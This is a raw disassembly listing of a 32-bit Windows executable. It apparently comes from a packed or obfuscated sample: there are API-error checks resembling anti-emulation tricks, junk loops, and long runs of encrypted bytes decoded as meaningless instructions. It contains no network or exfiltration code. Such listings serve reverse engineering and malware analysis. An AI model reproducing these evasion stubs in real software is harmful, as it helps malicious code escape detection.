0x00401000:	pushl	%ebp	; from: 0x00416950(MAY)
0x00401001:	movl	%esp, %ebp
0x00401003:	subl	$0x70, %esp
0x00401006:	movl	$0x0, -72(%ebp)
0x0040100d:	movl	$0x0, -24(%ebp)
0x00401014:	movl	$0x0, -112(%ebp)
0x0040101b:	movl	$0x0, -96(%ebp)
0x00401022:	movl	$0x0, -8(%ebp)
0x00401029:	movl	$0x0, -108(%ebp)
0x00401030:	movl	$0x0, -104(%ebp)
0x00401037:	movl	$0x0, -20(%ebp)
0x0040103e:	movl	$0x0, -76(%ebp)
0x00401045:	movl	$0x0, -16(%ebp)
0x0040104c:	movl	$0x0, -88(%ebp)
0x00401053:	movl	$0x0, -4(%ebp)
0x0040105a:	movl	$0x0, -92(%ebp)
0x00401061:	movl	$0x0, -48(%ebp)
0x00401068:	movl	$0x0, -84(%ebp)
0x0040106f:	movl	$0x0, -44(%ebp)
0x00401076:	movl	$0x0, -80(%ebp)
0x0040107d:	movl	$0x0, -12(%ebp)
0x00401084:	movl	0x00448fa8, %eax
0x00401089:	movl	%eax, -40(%ebp)
0x0040108c:	movl	0x00448fac, %ecx
0x00401092:	movl	%ecx, -36(%ebp)	; from: 0x004010ff(MAY)
0x00401095:	movl	0x00448fb0, %edx
0x0040109b:	movl	%edx, -32(%ebp)
0x0040109e:	movb	0x00448fb4, %al
0x004010a3:	movb	%al, -28(%ebp)
0x004010a6:	movl	0x00448fb8, %ecx
0x004010ac:	movl	%ecx, -64(%ebp)
0x004010af:	movl	0x00448fbc, %edx
0x004010b5:	movl	%edx, -60(%ebp)
0x004010b8:	movl	0x00448fc0, %eax
0x004010bd:	movl	%eax, -56(%ebp)
0x004010c0:	movw	0x00448fc4, %cx
0x004010c7:	movw	%cx, -52(%ebp)
0x004010cb:	movb	0x00448fc6, %dl
0x004010d1:	movb	%dl, -50(%ebp)
0x004010d4:	movl	$0x40, -48(%ebp)
0x004010db:	leal	-64(%ebp), %eax
0x004010de:	pushl	%eax
0x004010df:	leal	-16(%ebp), %ecx
0x004010e2:	pushl	%ecx
0x004010e3:	call	ConvertSidToStringSidW@advapi32.dll	; targets: 0xff000020(MAY)
0x004010e9:	testl	%eax, %eax
0x004010eb:	je	0x004152d6	; targets: 0x004010f1(MAY), 0x004152d6(MAY)
0x004010f1:	movl	-16(%ebp), %edx	; from: 0x004010eb(MAY)
0x004010f4:	addl	$0x1, %edx
0x004010f7:	movl	%edx, -16(%ebp)
0x004010fa:	daa	
0x004010fb:	cld	
0x004010fd:	movb	$0x71, %ch
0x004010ff:	jg	0x00401092	; targets: 0x00401092(MAY)
0x004152d6:	call	GetLastError@kernel32.dll	; targets: 0xff000060(MAY)	; from: 0x004010eb(MAY)
0x004152dc:	movl	%eax, -44(%ebp)
0x004152df:	movzwl	-44(%ebp), %eax
0x004152e3:	cmpl	$0x539, %eax
0x004152e8:	jne	0x00415319	; targets: 0x004152ea(MAY), 0x00415319(MAY)
0x004152ea:	movl	$0xe0d, -20(%ebp)	; from: 0x004152e8(MAY)
0x004152f1:	leal	-40(%ebp), %ecx
0x004152f4:	pushl	%ecx
0x004152f5:	call	GetModuleHandleA@kernel32.dll	; targets: unresolved
0x00415319:	movb	$0x0, 0x00417038	; from: 0x004152e8(MAY)
0x00415320:	pushl	$0x42cfc8
0x00415325:	call	GetModuleHandleA@kernel32.dll	; targets: unresolved

start:
0x00415418:	pushl	%ebp
0x00415419:	movl	%esp, %ebp
0x0041541b:	subl	$0x54, %esp
0x0041541e:	movl	$0x0, -52(%ebp)
0x00415425:	movl	$0x0, -4(%ebp)
0x0041542c:	movl	$0x0, -80(%ebp)
0x00415433:	movl	$0x0, -76(%ebp)
0x0041543a:	movl	$0x0, -48(%ebp)
0x00415441:	leal	-56(%ebp), %eax
0x00415444:	pushl	%eax
0x00415445:	pushl	$0x8
0x00415447:	call	GetTempPathA@kernel32.dll	; targets: 0xff000040(MAY)
0x0041544d:	call	GetLastError@kernel32.dll	; targets: 0xff000060(MAY)
0x00415453:	movl	%eax, -48(%ebp)
0x00415456:	leal	-72(%ebp), %ecx
0x00415459:	pushl	%ecx
0x0041545a:	call	GetLocalTime@kernel32.dll	; targets: 0xff000050(MAY)
0x00415460:	movl	-52(%ebp), %edx
0x00415463:	pushl	%edx
0x00415464:	call	0x00415493	; targets: 0x00415493(MAY)
0x00415469:	addl	$0x4, %esp	; from: 0x0041695e(MAY)
0x0041546c:	call	0x0041695f	; targets: 0x0041695f(MAY)
0x00415471:	movl	$0x0, -84(%ebp)	; from: 0x0041696d(MAY)
0x00415478:	jmp	0x00415483	; targets: 0x00415483(MAY)
0x0041547a:	movl	-84(%ebp), %eax	; from: 0x00415489(MAY)
0x0041547d:	addl	$0x1, %eax
0x00415480:	movl	%eax, -84(%ebp)
0x00415483:	cmpl	$0x64, -84(%ebp)	; from: 0x00415478(MAY)
0x00415487:	jae	0x0041548b	; targets: 0x00415489(MAY)
0x00415489:	jmp	0x0041547a	; targets: 0x0041547a(MAY)	; from: 0x00415487(MAY)
0x00415493:	pushl	%ebp	; from: 0x00415464(MAY)
0x00415494:	movl	%esp, %ebp
0x00415496:	subl	$0x3c, %esp
0x00415499:	pushl	%esi
0x0041549a:	movl	$0x0, -60(%ebp)
0x004154a1:	movl	$0x0, -56(%ebp)
0x004154a8:	movl	$0x0, -48(%ebp)
0x004154ac:	addb	%al, (%eax)	; from: 0x00415507(MAY)
0x004154ae:	addb	%al, %bh
0x004154af:	movl	$0x0, -36(%ebp)
0x004154b0:	incl	%ebp
0x004154b1:	faddl	(%eax)
0x004154b3:	addb	%al, (%eax)
0x004154b5:	addb	%al, %bh
0x004154b6:	movl	$0x0, -28(%ebp)
0x004154b7:	incl	%ebp
0x004154b8:	inb	$0x0, %al
0x004154ba:	addb	%al, (%eax)
0x004154bc:	addb	%al, %bh
0x004154bd:	movl	$0x0, -40(%ebp)
0x004154be:	incl	%ebp
0x004154bf:	fadds	(%eax)
0x004154c1:	addb	%al, (%eax)
0x004154c3:	addb	%al, %bh
0x004154c4:	movl	$0x448fc8, -44(%ebp)
0x004154cb:	movl	$0x96a854dd, -36(%ebp)
0x004154d2:	movl	$0x0, -52(%ebp)
0x004154d9:	movl	-36(%ebp), %eax
0x004154dc:	movl	%eax, -32(%ebp)
0x004154df:	movl	$0x0, -4(%ebp)
0x004154e0:	incl	%ebp	; from: 0x00415513(MAY)
0x004154e1:	cld	
0x004154e2:	addb	%al, (%eax)
0x004154e4:	addb	%al, (%eax)
0x004154e6:	movl	GetLastError@kernel32.dll, %ecx	; from: 0x0041554c(MAY)
0x004154ec:	movl	%ecx, -4(%ebp)
0x004154ef:	pushl	$0x0
0x004154f1:	pushl	$0x4e
0x004154f3:	pushl	$0x1e
0x004154f5:	pushl	$0x0
0x004154f7:	pushl	$0xffffffff
0x004154f9:	call	VirtualProtectEx@kernel32.dll	; targets: 0xff000010(MAY)
0x004154ff:	testl	%eax, %eax
0x00415501:	je	0x0041693e	; targets: 0x00415507(MAY), 0x0041693e(MAY)
0x00415507:	jns	0x004154ac	; targets: 0x00415509(MAY), 0x004154ac(MAY)	; from: 0x00415501(MAY)
0x00415509:	movb	$0xffffff90, %bh	; from: 0x00415507(MAY)
0x0041550b:	pushl	%esi
0x0041550c:	xchgl	%eax, %ecx
0x0041550d:	outl	%eax, $0xfffffff8
0x0041550f:	jnl	0x00415574	; targets: 0x00415511(MAY)
0x00415511:	subb	%bl, (%edi)	; from: 0x0041550f(MAY)
0x00415513:	jp	0x004154e0	; targets: 0x004154e0(MAY), 0x00415515(MAY)
0x00415515:	stc		; from: 0x00415513(MAY)
0x00415516:	daa	
0x00415517:	subb	%dl, -111(%ebp)
0x0041551a:	outl	%eax, $0xfffffff8
0x0041551c:	jns	0x00415581	; targets: 0x00415581(MAY), 0x0041551e(MAY)
0x0041551e:	subb	%bl, -123(%edi)	; from: 0x0041551c(MAY)
0x00415521:	xorb	$0xfffffff9, %al
0x00415523:	daa	
0x00415524:	nop	
0x00415525:	pushl	%ebp
0x00415526:	xchgl	%eax, %ecx
0x00415527:	outl	%eax, $0xfffffff8
0x00415529:	jns	0x0041558e	; targets: 0x0041552b(MAY), 0x0041558e(MAY)
0x0041552b:	subb	%bl, (%edi)	; from: 0x00415529(MAY)
0x0041552d:	testl	%esi, (%ecx,%edi,8)
0x00415530:	daa	
0x00415531:	nop	
0x00415532:	pushl	%ebp
0x00415533:	xchgl	%eax, %ecx
0x00415534:	outl	%eax, $0xfffffff8
0x00415536:	jns	0x0041559b	; targets: 0x00415538(MAY), 0x0041559b(MAY)
0x00415538:	subb	%bl, (%edi)	; from: 0x00415536(MAY)
0x0041553a:	testl	%esi, (%ecx,%edi,8)
0x0041553d:	daa	
0x0041553e:	nop	
0x0041553f:	pushl	%ebp
0x00415540:	xchgl	%eax, %ecx
0x00415541:	outl	%eax, $0xfffffff8
0x00415543:	jno	0x004155a7	; targets: 0x004155a7(MAY)
0x0041554b:	nop		; from: 0x004155a7(MAY)
0x0041554c:	loope	0x004154e6	; targets: 0x004154e6(MAY), 0x0041554e(MAY)
0x0041554e:	subb	%cl, %bl	; from: 0x0041554c(MAY)
0x00415550:	shll	$0xffffffd2, 0x64(%edx)
0x00415581:	xchgl	%eax, %ecx	; from: 0x0041551c(MAY)
0x00415582:	outl	%eax, $0xfffffff8
0x00415584:	jns	0x004155e9	; targets: 0x004155e9(MAY)
0x0041558e:	decl	%esp	; from: 0x00415529(MAY)
0x0041558f:	fsts	0x1(%esi)
0x00415592:	movl	$0xe9fdb116, %esi
0x00415597:	fcoml	(%esi,%esi,2)
0x0041559a:	movb	%dh, 0x46a48049(%ebx)
0x0041559b:	movb	$0x49, %bl	; from: 0x00415536(MAY)
0x0041559d:	andb	$0x57, -1957114597(%esi,%eax,2)
0x004155a0:	sbbl	%ebp, %ecx
0x004155a2:	popl	%eax
0x004155a3:	movl	0x5f(%edi), %edx
0x004155a5:	popl	%edi
0x004155a6:	decl	%ebp
0x004155a7:	jo	0x0041554b	; targets: 0x004155a9(MAY), 0x0041554b(MAY)	; from: 0x00415543(MAY)
0x004155a9:	xorb	$0x25, %al	; from: 0x004155a7(MAY)
0x004155ab:	insb	%dx, %es:(%edi)
0x004155ac:	int	$0x50
0x004155ae:	ret	$0xffffecd4	; targets: unresolved

0x004155e9:	je	0x00415625	; targets: 0x00415625(MAY), 0x004155eb(MAY)	; from: 0x00415584(MAY)
0x004155eb:	movl	$0xec4df51b, %edi	; from: 0x004155e9(MAY)
0x004155f1:	pushl	%edi
0x004155f2:	xchgl	%eax, %ecx
0x004155f3:	sbbl	%edi, (%esi)
0x004155f5:	subl	$0x79f8e74c, %eax
0x004155fa:	arpl	%bp, (%eax)
0x004155fc:	popl	%ds
0x004155fd:	testl	%esi, (%ecx,%edi,8)
0x00415600:	daa	
0x00415601:	nop	
0x00415602:	pushl	%ebp
0x00415603:	xchgl	%eax, %ecx
0x00415604:	outl	%eax, $0xfffffff8
0x00415606:	jns	0x0041566b	; targets: 0x00415608(MAY), 0x0041566b(MAY)
0x00415608:	subb	%bl, (%edi)	; from: 0x00415606(MAY)
0x0041560a:	testl	%esi, (%ecx,%edi,8)
0x0041560d:	daa	
0x0041560e:	nop	
0x0041560f:	addl	$0x35f8e7d4, %eax
0x00415614:	boundl	(%ebx), %ebp
0x00415616:	popl	%ds
0x00415617:	jecxz	0x00415693	; targets: 0x00415619(MAY), 0x00415693(MAY)
0x00415619:	movb	$0x68, %ah	; from: 0x00415617(MAY)
0x0041561b:	nop	
0x0041561c:	pushl	%ebp
0x00415625:	clc		; from: 0x004155e9(MAY)
0x00415627:	subb	$0xffffff91, %al
0x00415629:	popl	%edi
0x0041562a:	xchgl	%eax, %ecx
0x0041562b:	outl	%eax, $0x1a
0x0041562d:	jnl	0x00415692	; targets: 0x0041562f(MAY), 0x00415692(MAY)
0x0041562f:	subb	%bl, 0x27f93483(%ebx)	; from: 0x0041562d(MAY)
0x00415635:	nop	
0x00415636:	pushl	%ebp
0x00415637:	rcrb	%cl, -8(%edx)
0x0041563a:	jns	0x0041569f	; targets: 0x0041563c(MAY), 0x0041569f(MAY)
0x0041563c:	cmpb	%bl, (%edi)	; from: 0x0041563a(MAY)
0x0041563e:	testl	%esi, (%ecx,%edi,8)
0x00415641:	andb	-123236011(%eax), %dl
0x00415647:	jns	0x004156bc	; targets: 0x00415649(MAY), 0x004156bc(MAY)
0x00415649:	subb	%bl, (%edi)	; from: 0x00415647(MAY)
0x0041564b:	testl	%esi, (%esi)
0x0041566b:	xchgl	%eax, %ebx	; from: 0x00415606(MAY)
0x0041566c:	outl	%eax, $0xffffffb8
0x0041566e:	clc	
0x0041566f:	arpl	%bp, (%eax)
0x00415671:	jne	-1876432588	; targets: 0x00415677(MAY), 0x90693fab(MAY)
0x00415677:	pushl	%ebp	; from: 0x00415671(MAY)
0x00415678:	xchgl	%eax, %ecx
0x00415679:	idivl	%eax, %eax
0x0041567b:	jns	0x004156f0	; targets: 0x004156f0(MAY), 0x0041567d(MAY)
0x0041567d:	subb	%bl, (%edi)	; from: 0x0041567b(MAY)
0x00415692:	xchgl	%eax, %ecx	; from: 0x0041562d(MAY)
0x00415693:	movl	$0x286379fb, %esi	; from: 0x00415617(MAY)
0x0041569f:	xchgl	%eax, %ecx	; from: 0x0041563a(MAY)
0x004156a0:	outl	%eax, $0xfffffff8
0x004156a2:	jns	0x00415707	; targets: 0x00415707(MAY)
0x004156bc:	jns	0x00415721	; targets: 0x00415721(MAY)	; from: 0x00415647(MAY)
0x004156f0:	jns	0x00415755	; targets: 0x00415755(MAY)	; from: 0x0041567b(MAY)
0x00415707:	movl	$0x17019d93, %edi	; from: 0x004156a2(MAY)
0x0041570c:	subb	%bl, (%edi)
0x0041570e:	testl	%esi, (%ecx,%ecx,2)
0x00415711:	subb	$0xffffff90, %al
0x00415713:	pushl	%ebp
0x00415714:	andl	$0x2c0579f8, %edi
0x00415721:	rclb	%cl, %ch	; from: 0x004156bc(MAY)
0x00415723:	lodsb	%ds:(%esi), %al
0x00415724:	arpl	%bp, %ss:(%eax)
0x00415727:	popl	%ds
0x00415728:	testl	%esi, (%ecx,%edi,8)
0x00415755:	xchgl	%eax, %ecx	; from: 0x004156f0(MAY)
0x00415756:	popl	%es
0x0041693e:	movl	-4(%ebp), %esi	; from: 0x00415501(MAY)
0x00416941:	call	%esi	; targets: 0xff000060(MAY)
0x00416943:	movl	%eax, -56(%ebp)
0x00416946:	cmpl	$0x57, -56(%ebp)
0x0041694a:	jne	0x00416958	; targets: 0x00416958(MAY), 0x0041694c(MAY)
0x0041694c:	movl	-32(%ebp), %edx	; from: 0x0041694a(MAY)
0x0041694f:	pushl	%edx
0x00416950:	call	0x00401000	; targets: 0x00401000(MAY)
0x00416958:	xorl	%eax, %eax	; from: 0x0041694a(MAY)
0x0041695a:	popl	%esi
0x0041695b:	movl	%ebp, %esp
0x0041695d:	popl	%ebp
0x0041695e:	ret	; targets: 0x00415469(MAY)

0x0041695f:	pushl	%ebp	; from: 0x0041546c(MAY)
0x00416960:	movl	%esp, %ebp
0x00416962:	subl	$0x124, %esp
0x00416968:	xorl	%eax, %eax
0x0041696a:	movl	%ebp, %esp
0x0041696c:	popl	%ebp
0x0041696d:	ret	; targets: 0x00415471(MAY)

